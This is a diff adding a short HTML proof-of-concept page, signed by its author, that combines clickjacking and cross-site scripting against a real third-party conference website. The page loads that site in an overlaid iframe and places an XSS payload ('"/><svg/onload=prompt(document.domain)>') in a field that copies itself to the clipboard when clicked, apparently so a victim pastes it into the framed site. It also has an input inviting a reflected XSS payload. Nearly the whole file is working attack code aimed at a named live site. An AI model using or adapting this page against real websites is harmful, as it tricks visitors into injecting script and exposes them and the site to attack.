@@ -1,0 +1,30 @@
+<html>
+<head>
+<title>Click jack to xss (cross site scripting )</title>
+</head>
+<body>
+<h1>Click Jackking by susant wagle </h1>
+Message :<input id="copy-text" type="text" value='"/><svg/onload=prompt(document.domain)>"'>
+<br><br><br>
+<script>
+document.getElementById("copy-text").onclick = function(){
+this.select();
+document.execCommand('copy');
+alert("xss by susant !")
+}
+</script>
+<style>
+iframe {
+width: 600px;
+height: 450px;
+position: absolute;
+top: 0; right: 10;
+filter: alpha(opacity=50);
+opacity: 1;
+}
+</style>
+<iframe src="https://www.rsaconference.com/"></iframe>
+<input type="text" name="clickjack" value="" placeholder="Enter your payload for reflected xss "><br><br>
+<input type="submit" name="submit" value="Click For the clickjack">
+</body>
+</html>
